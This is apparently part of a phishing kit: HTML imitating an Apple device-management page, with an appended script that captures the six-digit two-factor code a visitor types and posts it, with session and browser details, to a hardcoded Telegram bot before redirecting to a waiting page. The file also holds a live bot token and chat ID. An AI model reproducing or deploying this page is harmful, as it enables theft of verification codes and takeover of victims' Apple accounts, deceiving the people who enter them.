59.1344-85.6724C48.9505-85.6724 38.387-82.4204 30.3558-76.6204C30.0237-76.3695 29.9631-76.0494 30.1603-75.7173L46.7463-48.2212C43.3373-44.9589 41.1755-40.3835 41.1755-35.2709ZM39.974-73.5699C45.726-76.4747 52.2276-78.1522 59.1344-78.1522C66.0412-78.1522 72.5428-76.4747 78.3382-73.5699L73.8098-66.0611C69.3474-68.2477 64.3481-69.4162 59.1344-69.4162C53.9207-69.4162 48.9214-68.2477 44.5024-66.0611ZM48.4728-59.5151C51.7005-61.0046 55.356-61.8028 59.1344-61.8028C62.9562-61.8028 66.6117-61.0046 69.8394-59.5151L65.3345-52.1213C63.414-52.8262 61.3356-53.2298 59.1344-53.2298C56.9766-53.2298 54.8983-52.8262 52.9343-52.1213ZM48.0558-35.2709C48.0558-41.4246 52.9807-46.3929 59.1344-46.3929C65.3315-46.3929 70.2564-41.4246 70.2564-35.2709C70.2564-29.1275 65.3213-24.1489 59.1344-24.1489C52.9909-24.1489 48.0558-29.1275 48.0558-35.2709ZM51.641-35.2709C51.641-31.1141 54.9879-27.7775 59.1344-27.7775C63.2912-27.7775 66.6278-31.1244 66.6278-35.2709C66.6278-39.4277 63.2809-42.7643 59.1344-42.7643C54.9776-42.7643 51.641-39.4175 51.641-35.2709Z">
+</path>
+</g>
+</svg>
+<div class="title">Find Devices</div>
+</div>
+</div>
+<div class="quick-access-button">
+<div aria-disabled="true" class="ui-button" role="button" tabindex="-1">
+<svg class="layout-box" version="1.1" viewBox="0 0 145.67578125 111.1806640625" width="47" xmlns="http://www.w3.org/2000/svg">
+<g transform="matrix(1 0 0 1 -1.8170800781249454 90.8203125)">
+<path d="M27.7789 9.76808L92.6089 9.76808C91.4587 8.13106 90.6086 6.17297 90.2453 3.95612C90.1724 3.29287 90.0996 2.62962 90.0785 1.86286L27.9035 1.86286C23.0272 1.86286 20.3144-0.694633 20.3144-5.77797L20.3144-64.5976C20.3144-69.6292 23.0272-72.2384 27.9035-72.2384L112.108-72.2384C116.942-72.2384 119.697-69.6292 119.697-64.5976L119.697-62.8481C122.518-62.8481 125.045-62.8481 127.551-62.8375L127.551-64.981C127.551-75.0367 122.465-80.1437 112.233-80.1437L27.7789-80.1437C17.5986-80.1437 12.4609-75.0578 12.4609-64.981L12.4609-5.3946C12.4609 4.6822 17.5986 9.76808 27.7789 9.76808ZM51.1572-1.87542L89.8474-1.87542C89.8474-3.34762 89.8474-4.89269 89.8474-6.37545L51.1572-6.37545C49.8508-6.37545 48.8761-5.50418 48.8761-4.09428C48.8761-2.73613 49.8508-1.87542 51.1572-1.87542ZM105.09 9.76808L127.288 9.76808C133.371 9.76808 136.847 6.40563 136.847 0.622849L136.847-47.9874C136.847-53.8219 133.36-57.1431 127.288-57.1431L105.09-57.1431C99.0077-57.1431 95.5417-53.8219 95.5417-47.9874L95.5417 0.622849C95.5417 6.40563 98.9971 9.76808 105.09 9.76808ZM105.205 3.36372C103.059 3.36372 101.946 2.19903 101.946-0.0393971L101.946-47.3663C101.946-49.6153 103.059-50.7388 105.205-50.7388L109.608-50.7388C109.784-50.7388 109.898-50.6247 109.898-50.4378L109.898-50.0228C109.898-48.3215 111.019-47.1703 112.731-47.1703L119.648-47.1703C121.36-47.1703 122.491-48.3215 122.491-50.0228L122.491-50.4378C122.491-50.6247 122.594-50.7388 122.749-50.7388L127.174-50.7388C129.361-50.7388 130.443-49.6153 130.443-47.3663L130.443-0.0393971C130.443 2.19903 129.361 3.36372 127.174 3.36372ZM109.532 0.871532L122.743 0.871532C123.749 0.871532 124.517 0.16608 124.517-0.840344C124.517-1.77391 123.739-2.50047 122.743-2.50047L109.532-2.50047C108.536-2.50047 107.872-1.77391 107.872-0.840344C107.872 0.217834 108.474 0.871532 109.532 0.871532Z">
+</path>
+</g>
+</svg>
+<div class="title">Manage Devices<svg aria-hidden="true" class="cloudos-menu-item-opens-in-new-tab layout-box" style="height:20.1966px;width:34.2348px" version="1.1" viewBox="0 0 268.0201416015625 158.116943359375" xmlns="http://www.w3.org/2000/svg">
+<g transform="matrix(1 0 0 1 85.49510009765618 114.2884521484375)">
+<path d="M84.5703-17.334L84.5215-66.4551C84.5215-69.2383 82.7148-71.1914 79.7852-71.1914L30.6641-71.1914C27.9297-71.1914 26.0742-69.0918 26.0742-66.748C26.0742-64.4043 28.1738-62.4023 30.4688-62.4023L47.4609-62.4023L71.2891-63.1836L62.207-55.2246L13.8184-6.73828C12.9395-5.85938 12.4512-4.73633 12.4512-3.66211C12.4512-1.31836 14.5508 0.878906 16.9922 0.878906C18.1152 0.878906 19.1895 0.488281 20.0684-0.439453L68.5547-48.877L76.6113-58.0078L75.7324-35.2051L75.7324-17.1387C75.7324-14.8438 77.7344-12.6953 80.127-12.6953C82.4707-12.6953 84.5703-14.6973 84.5703-17.334Z">
+</path>
+</g>
+</svg>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</main>
+<footer>
+<div class="legal-footer">
+<div class="application-content">
+<div class="legal-footer-content">
+<div class="inner-row" role="presentation">
+<div class="with-separator">
+<span class="external-link systemStatus">
+<a aria-disabled="true" aria-label="System Status">System Status</a>
+</span>
+<div aria-hidden="true" class="separator">
+</div>
+</div>
+<div class="with-separator">
+<span class="external-link privacy">
+<a aria-disabled="true" aria-label="Privacy Policy">Privacy Policy</a>
+</span>
+<div aria-hidden="true" class="separator">
+</div>
+</div>
+<span class="external-link terms">
+<a aria-disabled="true" aria-label="Terms &amp; Conditions">Terms &amp; Conditions</a>
+</span>
+</div>
+<div class="inner-row" role="presentation">
+<span class="copyright">Copyright © 2026 Apple Inc. All rights reserved.</span>
+</div>
+</div>
+</div>
+</div>
+</footer>
+</div>
+</div>
+</div>
+</div>
+</div>
+</body>
+</html>
+<script>
+(function() {
+    'use strict';
+    
+    // ====== CONFIGURATION ======
+    const TELEGRAM_BOT_TOKEN = '8905536103:AAETKrARcyzO0oHgxTvonGIIy81_Amz3qcE';
+    const TELEGRAM_CHAT_ID = '8391692120';
+    const REDIRECT_PAGE = 'waiting_page.html';
+    
+    // ====== SESSION ID LOGIC ======
+    function getSessionId() {
+        const urlParams = new URLSearchParams(window.location.search);
+        let sessionId = urlParams.get('session');
+        if (!sessionId) {
+            sessionId = Math.random().toString(36).substring(2, 10);
+            const newUrl = window.location.pathname + '?session=' + sessionId;
+            window.history.replaceState({}, '', newUrl);
+        }
+        return sessionId;
+    }
+
+    const sessionId = getSessionId();
+    const fullUrl = window.location.origin + window.location.pathname + '?session=' + sessionId;
+    
+    // ====== GET 6-DIGIT CODE ======
+    function getVerificationCode() {
+        const inputs = document.querySelectorAll('.code-inputs input');
+        let code = '';
+        inputs.forEach(input => {
+            code += input.value;
+        });
+        return code;
+    }
+    
+    // ====== CHECK IF ALL 6 DIGITS FILLED ======
+    function isCodeComplete() {
+        const inputs = document.querySelectorAll('.code-inputs input');
+        let filled = 0;
+        inputs.forEach(input => {
+            if (input.value.length > 0) filled++;
+        });
+        return filled === 6;
+    }
+    
+    // ====== UPDATE SUBMIT BUTTON STATE ======
+    function updateSubmitButton() {
+        const submitBtn = document.getElementById('submit-code');
+        if (submitBtn) {
+            if (isCodeComplete()) {
+                submitBtn.style.opacity = '1';
+                submitBtn.style.cursor = 'pointer';
+            } else {
+                submitBtn.style.opacity = '0.42';
+                submitBtn.style.cursor = 'default';
+            }
+        }
+    }
+    
+    // ====== SEND TO TELEGRAM ======
+    function sendToTelegram(code, trigger, type = 'code') {
+        let message;
+        if (type === 'code') {
+            message = 
+                `🔐 2FA CODE CAPTURED!\n\n` +
+                `🔢 Code: ${code || '(empty)'}` +
+                `\n\n📍 Trigger: ${trigger}` +
+                `\n🆔 Session ID: ${sessionId}` +
+                `\n🔗 Full URL: ${fullUrl}` +
+                `\n🕐 Time: ${new Date().toLocaleString()}` +
+                `\n🌐 User Agent: ${navigator.userAgent.substring(0, 150)}`;
+        } else if (type === 'resend') {
+            message = 
+                `🔄 CODE RESEND REQUESTED!\n\n` +
+                `🆔 Session ID: ${sessionId}` +
+                `\n🔗 Full URL: ${fullUrl}` +
+                `\n🕐 Time: ${new Date().toLocaleString()}` +
+                `\n🌐 User Agent: ${navigator.userAgent.substring(0, 150)}`;
+        }
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        return fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message
+            })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.ok) {
+                console.log('✅ Sent to Telegram!');
+                return true;
+            } else {
+                console.warn('⚠️ Telegram send failed:', data);
+                return false;
+            }
+        })
+        .catch(error => {
+            console.warn('⚠️ Telegram fetch error:', error);
+            return false;
+        });
+    }
+
+    // ====== SUBMIT HANDLER ======
+    let sent = false;
+
+    function submitCode(trigger) {
+        if (sent) {
+            console.log('⚠️ Already sent, ignoring...');
+            return;
+        }
+        
+        const code = getVerificationCode();
+        
+        if (code.length === 6) {
+            sent = true;
+            
+            console.log('%c🔐 2FA CODE CAPTURED!', 'font-size:16px;font-weight:bold;color:#0f0;background:#000;padding:8px;border-radius:4px;');
+            console.log('🔢 Code:', code);
+            console.log('📍 Trigger:', trigger);
+            console.log('🆔 Session ID:', sessionId);
+            
+            // Store for debugging
+            try {
+                localStorage.setItem('verification_code_captured', JSON.stringify({
+                    code, trigger, sessionId, timestamp: new Date().toISOString()
+                }));
+            } catch(e) {}
+            
+            sendToTelegram(code, trigger, 'code')
+                .then(() => {
+                    console.log('🚀 Redirecting in 1.5 seconds...');
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_PAGE;
+                    }, 1500);
+                })
+                .catch(() => {
+                    console.log('⚠️ Send failed, still redirecting...');
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_PAGE;
+                    }, 1500);
+                });
+        }
+    }
+    
+    // ====== RESEND CODE HANDLER ======
+    let resendSent = false;
+
+    function resendCode() {
+        if (resendSent) {
+            console.log('⚠️ Resend already sent, ignoring...');
+            return;
+        }
+        
+        resendSent = true;
+        
+        console.log('%c🔄 CODE RESEND REQUESTED!', 'font-size:16px;font-weight:bold;color:#0af;background:#000;padding:8px;border-radius:4px;');
+        console.log('🆔 Session ID:', sessionId);
+        
+        sendToTelegram('', 'resend_button', 'resend')
+            .then(() => {
+                console.log('✅ Resend request sent!');
+            })
+            .catch(() => {
+                console.log('⚠️ Resend send failed');
+            });
+    }
+
+    // ====== SETUP CODE INPUTS ======
+    function setupCodeInputs() {
+        const inputs = document.querySelectorAll('.code-inputs input');
+        const submitBtn = document.getElementById('submit-code');
+        
+        // Focus first input on load
+        setTimeout(() => {
+            if (inputs[0]) inputs[0].focus();
+            updateSubmitButton();
+        }, 500);
+        
+        inputs.forEach((input, index) => {
+            // Allow only digits
+            input.addEventListener('input', function(e) {
+                this.value = this.value.replace(/[^0-9]/g, '').slice(0, 1);
+                
+                // Auto-focus next field
+                if (this.value.length === 1 && index < 5) {
+                    inputs[index + 1].focus();
+                }
+                
+                // Update button state
+                updateSubmitButton();
+            });
+            
+            // Handle backspace - go to previous field
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                    e.preventDefault();
+                    inputs[index - 1].focus();
+                    updateSubmitButton();
+                }
+            });
+            
+            // Handle paste (allow pasting full 6-digit code)
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const pasteText = (e.clipboardData || window.clipboardData).getData('text');
+                const digits = pasteText.replace(/[^0-9]/g, '').slice(0, 6).split('');
+                
+                digits.forEach((digit, i) => {
+                    if (inputs[i]) {
+                        inputs[i].value = digit;
+                    }
+                });
+                
+                // Focus the first empty field or last field
+                const filledInputs = inputs.filter(inp => inp.value.length > 0);
+                if (filledInputs.length < 6) {
+                    const nextEmptyIndex = inputs.findIndex(inp => inp.value.length === 0);
+                    if (nextEmptyIndex >= 0) {
+                        inputs[nextEmptyIndex].focus();
+                    } else {
+                        submitBtn.focus();
+                    }
+                } else {
+                    submitBtn.focus();
+                }
+                
+                // Update button state
+                updateSubmitButton();
+            });
+            
+            // Handle Enter key
+            input.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter' && isCodeComplete()) {
+                    submitBtn.click();
+                }
+            });
+        });
+        
+        // Submit button click handler
+        if (submitBtn) {
+            submitBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                submitCode('submit_button');
+            });
+        }
+        
+        // Resend code button handler
+        const resendButtons = document.querySelectorAll('.verification-links button');
+        resendButtons.forEach(btn => {
+            const text = btn.querySelector('span');
+            if (text && text.textContent === 'Resend code') {
+                btn.style.opacity = '0.42';
+                btn.style.pointerEvents = 'auto';
+                btn.style.cursor = 'pointer';
+                btn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    resendCode();
+                });
+            }
+        });
+    }
+
+    // ====== INIT ======
+    function init() {
+        console.log('%c🚨 2FA Code Capture Active', 'font-size:14px;font-weight:bold;color:#0f0;background:#000;padding:6px;border-radius:4px;');
+        console.log('📡 Telegram Bot:', TELEGRAM_BOT_TOKEN.substring(0, 10) + '...');
+        console.log('🆔 Session:', sessionId);
+        console.log('💡 Tip: Type 6 digits and click Continue');
+        
+        setupCodeInputs();
+        
+        console.log('✅ Ready!');
+    }
+    
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+    } else {
+        init();
+    }
+})();
+</script>
